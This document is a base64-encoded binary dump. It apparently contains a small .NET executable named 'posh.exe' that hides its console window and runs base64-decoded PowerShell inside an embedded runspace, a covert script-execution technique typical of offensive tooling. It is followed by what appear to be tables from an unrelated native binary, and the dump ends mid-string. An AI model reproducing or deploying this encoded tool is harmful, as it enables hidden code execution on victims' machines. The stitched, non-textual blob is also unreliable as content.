QBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQ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gBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlJ1bnNwYWNlcwBSdW5zcGFjZUZhY3RvcnkAUnVuc3BhY2UAQ3JlYXRlUnVuc3BhY2UAT3BlbgBSdW5zcGFjZUludm9rZQBQaXBlbGluZQBDcmVhdGVQaXBlbGluZQBDb21tYW5kQ29sbGVjdGlvbgBnZXRfQ29tbWFuZHMAQWRkU2NyaXB0AFN5c3RlbS5Db2xsZWN0aW9ucy5PYmplY3RNb2RlbABDb2xsZWN0aW9uYDEAUFNPYmplY3QASW52b2tlAENsb3NlAFN5c3RlbS5UZXh0AFN0cmluZ0J1aWxkZXIAU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMASUVudW1lcmF0b3JgMQBHZXRFbnVtZXJhdG9yAGdldF9DdXJyZW50AEFwcGVuZABTeXN0ZW0uQ29sbGVjdGlvbnMASUVudW1lcmF0b3IATW92ZU5leHQASURpc3Bvc2FibGUARGlzcG9zZQBUb1N0cmluZwBTdHJpbmcAVHJpbQBFbmNvZGluZwBnZXRfVW5pY29kZQBDb252ZXJ0AEZyb21CYXNlNjRTdHJpbmcAR2V0U3RyaW5nAAAAAyAAAAAAABImvFF/esVCjSHEbVBc+e8ACLd6XFYZNOCJAgYIBAAAAAAEBQAAAAMAABgFAAICGAgDIAABBAABDg4EAAEBDgMAAAEEIAEBCAQgAQEOCDG/OFatNk41BAAAEhkFIAEBEhkEIAASIQQgABIlCCAAFRIpARItBhUSKQESLQggABUSNQETAAYVEjUBEi0EIAATAAUgARIxHAMgAAIDIAAOGgcJEhkSHRIhFRIpARItEjESLQ4VEjUBEi0CBAAAEkUFAAEdBQ4FIAEOHQUEBwIYDgMHARgIAQAIAAAAAAAeAQABAFQCFldyYXBOb25FeGNlcHRpb25UaHJvd3MBALwoAAAAAAAAAAAAAN4oAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAADQKAAAAAAAAAAAAAAAAAAAAAAAAAAAX0NvckV4ZU1haW4AbXNjb3JlZS5kbGwAAAAAAP8lACBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAEAAAACAAAIAYAAAAOAAAgAAAAAAAAAAAAAAAAAAAAQABAAAAUAAAgAAAAAAAAAAAAAAAAAAAAQABAAAAaAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAkAAAAKBAAAA8AgAAAAAAAAAAAADgQgAA6gEAAAAAAAAAAAAAPAI0AAAAVgBTAF8AVgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7/4AAAEAAAAAAAAAAAAAAAAAAAAAAD8AAAAAAAAABAAAAAEAAAAAAAAAAAAAAAAAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8AAAAAACQABAAAAFQAcgBhAG4AcwBsAGEAdABpAG8AbgAAAAAAAACwBJwBAAABAFMAdAByAGkAbgBnAEYAaQBsAGUASQBuAGYAbwAAAHgBAAABADAAMAAwADAAMAA0AGIAMAAAACwAAgABAEYAaQBsAGUARABlAHMAYwByAGkAcAB0AGkAbwBuAAAAAAAgAAAAMAAIAAEARgBpAGwAZQBWAGUAcgBzAGkAbwBuAAAAAAAwAC4AMAAuADAALgAwAAAANAAJAAEASQBuAHQAZQByAG4AYQBsAE4AYQBtAGUAAABwAG8AcwBoAC4AZQB4AGUAAAAAACgAAgABAEwAZQBnAGEAbABDAG8AcAB5AHIAaQBnAGgAdAAAACAAAAA8AAkAAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGEAbQBlAAAAcABvAHMAaAAuAGUAeABlAAAAAAA0AAgAAQBQAHIAbwBkAHUAYwB0AFYAZQByAHMAaQBvAG4AAAAwAC4AMAAuADAALgAwAAAAOAAIAAEAQQBzAHMAZQBtAGIAbAB5ACAAVgBlAHIAcwBpAG8AbgAAADAALgAwAC4AMAAuADAAAAAAAAAA77u/PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9InllcyI/Pg0KPGFzc2VtYmx5IHhtbG5zPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MSIgbWFuaWZlc3RWZXJzaW9uPSIxLjAiPg0KICA8YXNzZW1ibHlJZGVudGl0eSB2ZXJzaW9uPSIxLjAuMC4wIiBuYW1lPSJNeUFwcGxpY2F0aW9uLmFwcCIvPg0KICA8dHJ1c3RJbmZvIHhtbG5zPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MiI+DQogICAgPHNlY3VyaXR5Pg0KICAgICAgPHJlcXVlc3RlZFByaXZpbGVnZXMgeG1sbnM9InVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206YXNtLnYzIj4NCiAgICAgICAgPHJlcXVlc3RlZEV4ZWN1dGlvbkxldmVsIGxldmVsPSJhc0ludm9rZXIiIHVpQWNjZXNzPSJmYWxzZSIvPg0KICAgICAgPC9yZXF1ZXN0ZWRQcml2aWxlZ2VzPg0KICAgIDwvc2VjdXJpdHk+DQogIDwvdHJ1c3RJbmZvPg0KPC9hc3NlbWJseT4NCgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAADAAAAPA4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEjjAIABAAAAAAAAAAAAAAAuP0FWX2NvbV9lcnJvckBAAAAAAAAAAABI4wCAAQAAAAAAAAAAAAAALj9BVnR5cGVfaW5mb0BAAEjjAIABAAAAAAAAAAAAAAAuP0FWYmFkX2FsbG9jQHN0ZEBAAAAAAABI4wCAAQAAAAAAAAAAAAAALj9BVmV4Y2VwdGlvbkBzdGRAQAAAAAAASOMAgAEAAAAAAAAAAAAAAC4/QVZiYWRfYXJyYXlfbmV3X2xlbmd0aEBzdGRAQAAASOMAgAEAAAAAAAAAAAAAAC4/QVZiYWRfZXhjZXB0aW9uQHN0ZEBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQEAAAgRAAANBbAQCgEAAAwBAAANxbAQDAEAAAFhEAAOxbAQAWEQAAOBEAAABcAQBAEQAASBIAABBcAQBQEgAAeRYAACRcAQCAFgAAdhgAACBdAQCgGAAAzxgAAARmAQDQGAAAeBoAAOhdAQCAGgAAuBoAACReAQC4GgAA0xoAAFReAQDTGgAA4RoAAGheAQDwGgAAJhsAACReAQAmGwAAQRsAADBeAQBBGwAATxsAAEReAQBQGwAAVBsAABhjAQBUGwAAdxsAAHheAQB3GwAAkhsAAJBeAQCSGwAApRsAAKReAQClGwAAtRsAALReAQDAGwAA9BsAAARmAQAAHAAAKBwAABxeAQBAHAAAYRwAAMheAQBsHAAAqBwAADxiAQCoHAAA+BwAABhjAQD4HAAAIx4AAMxeAQAkHgAAph4AAPheAQCoHgAAnR8AACBfAQCgHwAA9B8AANhkAQD0HwAAMSAAADxoAQA8IAAAdSAAABhjAQB4IAAArCAAABhjAQCsIAAAwSAAABhjAQDEIAAA7CAAABhjAQDsIAAAASEAABhjAQAEIQAAZSEAANhkAQBoIQAAmCEAABhjAQCYIQAArCEAABhjAQCsIQAA9SEAADxiAQD4IQAAwSIAAHhfAQDEIgAAXSMAAFBfAQBgIwAAhCMAADxiAQCEIwAAryMAADxiAQCwIwAA/yMAADxiAQAAJAAAFyQAABhjAQAYJAAAnSQAANxgAQCwJAAAASUAAIhfAQAEJQAALyUAADxiAQAwJQAAZCUAADxiAQBkJQAANSYAAJhfAQA4JgAASyYAABhjAQBMJgAA5yYAAJBfAQDoJgAAVScAAKBfAQBYJwAAyScAAKxfAQDUJwAAEygAADxiAQA0KAAAcygAADxiAQCUKAAAySgAADxiAQDMKAAADikAAARmAQAQKQAAMCkAABxeAQAwKQAAUCkAABxeAQBkKQAAECoAALhfAQA8KgAAVyoAABhjAQBoKgAArSsAAMRfAQCwKwAA+isAADxoAQD8KwAARiwAADxoAQBILAAADi4AANRfAQAkLgAAQS4AABhjAQBELgAAnS4AAORfAQCgLgAAJS8AAAxhAQAoLwAAZy8AADxiAQCcLwAAXTAAAJhgAQBgMAAA5jAAAARmAQDoMAAAtjUAAHhgAQC4NQAAIjgAAPRgAQAkOAAA9jgAAGxiAQA8OQAA/TkAALBgAQAAOgAA4DsAADBhAQDgOwAAyj0AAPRfAQDMPQAAFj4AABhjAQAYPgAAqz8AADxgAQCsPwAAAkIAABxiAQAEQgAAQkMAANxgAQBEQwAAt0MAANhkAQC4QwAAgUQAAHBhAQCERAAArUUAAPxiAQCwRQAAQUYAAIhhAQBERgAA3EYAAOxhAQDcRgAAM0cAAJxhAQA0RwAAbkcAADxiAQBwRwAAx0cAAARmAQDIRwAA2kcAABhjAQDcRwAA7kcAABhjAQDwRwAAH0gAADxiAQAgSAAAOEgAADxiAQA4SAAAUEgAADxiAQBQSAAAcUkAAMhhAQB0SQAA8UkAANxhAQD0SQAAy0oAAABiAQDgSgAAgEwAABhiAQCATAAAe04AABxiAQB8TgAArk4AABhjAQCwTgAAxE4AABhjAQDETgAA1k4AABhjAQDYTgAA+E4AABhjAQD4TgAACE8AABhjAQAITwAAlU8AAOxnAQCYTwAAvU8AADxiAQDoTwAAElAAADxiAQAwUAAAZVQAADhiAQBoVAAAh1QAABhjAQCIVAAA1VQAADxiAQDYVAAA8VQAABhjAQD0VAAArFUAADxoAQCsVQAA61UAABhjAQDsVQAADlYAABhjAQAQVgAAN1YAABhjAQA4VgAAYVYAADxiAQBwVgAAq1YAAARmAQC0VgAAIFcAADxiAQAwVwAAcFcAAEhiAQCQVwAAtFcAAFBiAQDAVwAA2FcAAFhiAQDgVwAA4VcAAFxiAQDwVwAA8VcAAGBiAQD0VwAAOlgAADxiAQA8WAAAc1gAADxiAQB0WAAAPFoAAGxiAQA8WgAAkFoAAARmAQCQWgAA5FoAAARmAQDkWgAAOFsAAARmAQA4WwAAn1sAADxoAQCgWwAAF1wAANhkAQBkXAAAolwAAGRiAQDgXAAAIF0AAARmAQAgXQAAVF0AAIhiAQBUXQAAyl0AANxgAQDMXQAAGF4AADxoAQAsXgAAuV8AANhkAQDIXwAANGEAAKhiAQA0YQAAfWEAADxiAQCAYQAA7GEAAARmAQAYYgAA1GMAAPxiAQDUYwAANWQAADxiAQA4ZAAArmUAAOhiAQCwZQAAHGYAAARmAQAcZgAAFWcAACxjAQAYZwAAWWcAACBjAQBcZwAAdmcAABhjAQB4ZwAAkmcAABhjAQCUZwAAzGcAABhjAQDUZwAAD2gAAFRjAQAQaAAAr2kAAHhjAQCwaQAAimsAAPxiAQCcawAA1msAAExjAQAYbAAAYGwAAERjAQB0bAAAl2wAABhjAQCYbAAAqGwAABhjAQCobAAA+WwAADxiAQAEbQAAkm0AADxiAQCsbQAAwG0AABhjAQDAbQAA0G0AABhjAQDkbQAA9G0AABhjAQD0bQAAG24AAKhjAQAcbgAAe24AADxiAQB8bgAAuW4AAKRmAQC8bgAAGm8AADxiAQAcbwAAcW8AABhjAQB0bwAA6W8AADxiAQDsbwAAfHAAAARmAQB8cAAAxHAAADxiAQDgcAAAF3EAADxiAQA0cQAAk3EAACBkAQCUcQAA2XEAAPxjAQDccQAAG3IAANhjAQAccgAAWXIAAERkAQBccgAAKXMAAMhjAQAscwAATHMAAKRmAQBMcwAAQXQAANBjAQBEdAAAq3QAAARmAQCsdAAA7XQAADxiAQDwdAAAhHUAAARmAQCEdQAAI3YAADxoAQAkdgAAXXYAABhjAQBgdgAAgnYAABhjAQCEdgAAJHgAAGxiAQAkeAAAeXgAAARmAQB8eAAA0XgAAARmAQDUeAAAKXkAAARmAQAseQAAlHkAADxoAQCUeQAADHoAANhkAQAMegAA+3oAAHBkAQD8egAAYXsAADxoAQBkewAAm3sAAGhkAQCcewAAIXwAANBbAQAkfAAAZXwAADxiAQBofAAAw30AAIhkAQDMfQAAc34AAKhkAQB0fgAAkn4AAAxqAQCUfgAA2n4AABhjAQAkfwAAcn8AAARmAQB0fwAAlH8AABhjAQCUfwAAtH8AABhjAQDIfwAA0YEAAMBkAQDUgQAA5IIAAOxkAQDkggAAkIQAAAhlAQCQhAAAV4UAANhkAQBghQAAmIUAAJhlAQCYhQAAr4cAADxoAQCwhwAALYgAAIhoAQAwiAAAwIgAANhkAQDAiAAAoooAAGxlAQCkigAAWYwAAIhlAQBcjAAAg4wAABhjAQCEjAAAQ40AAChlAQBEjQAA648AAExlAQDsjwAAYZAAALxlAQB4kAAAnZAAABhjAQCgkAAAo5EAAMxlAQCskQAAQZIAANhkAQBEkgAAYJIAABhjAQBskgAAV5MAABBmAQBYkwAAU5QAAOxnAQBUlAAAj5QAAORlAQCQlAAA0JQAAARmAQDQlAAAZJUAANhkAQBklQAAs5UAADxoAQC0lQAA+ZUAAGBmAQD8lQAAKpYAACxmAQBMlgAA5ZgAADRmAQAQmQAAVZkAAARmAQBgmQAAqJoAAHBkAQCwmgAA4ZoAADxiAQDkmgAAFZsAADxiAQAYmwAAPpsAABhjAQBAmwAAX5wAANxgAQBgnAAAu5wAADxiAQDgnAAAJ50AAIRmAQAonQAAV50AABhjAQDknQAAWp8AANhkAQCEnwAAup8AAKRmAQDknwAAjKAAABhjAQCMoAAA/KAAAKxmAQD8oAAAZKEAAARmAQBkoQAAK6IAANBmAQAsogAAXqIAABhjAQBgogAAd6IAADRnAQB3ogAAK6MAAERnAQArowAALKMAAGBnAQAwowAAi6MAAOhmAQCLowAAR6YAAABnAQBHpgAAZKYAACRnAQBkpgAANqcAAARmAQA4pwAA1qcAAHBnAQDgpwAAdqgAAIBnAQB4qAAAj6gAABhjAQCQqAAAQaoAAIxnAQBEqgAAn60AAMRnAQCgrQAANq4AALRnAQA4rgAAca4AABhjAQB0rgAA9q4AAARmAQD4rgAAja8AANhkAQCQrwAA4K8AAABoAQDgrwAAl7AAABBoAQDgsAAAmrEAAOxnAQCcsQAAEbIAABhjAQAUsgAAc7IAABhjAQB0sgAA67IAADxoAQDssgAAN7MAADxiAQBEswAAKLQAAExoAQAotAAAZ7QAAIhoAQBotAAAGrUAAJBoAQActQAAXLUAADxiAQBctQAAZrYAALRoAQBotgAA1LYAAKRmAQDUtgAAKrcAADxoAQAstwAANLgAALxoAQBUuAAA4LgAAMxoAQDguAAAcbkAABRqAQB0uQAAfLsAADhpAQB8uwAAgbwAAFhpAQCEvAAAoL0AAFhpAQCgvQAAEr8AAHhpAQAUvwAAAMAAAPBoAQAAwAAA4cIAACBpAQDwwgAAm8gAAKBpAQCcyAAANckAADxoAQBAyQAAw8kAAARmAQDEyQAALcoAAKxpAQAwygAAicoAAJhfAQCMygAA8coAANBpAQD0ygAArcsAADxoAQCwywAA18wAANhpAQDgzAAAUM0AAPhpAQBQzQAAcM0AAAxqAQBwzQAABs4AAABqAQAIzgAAec4AABxqAQB8zgA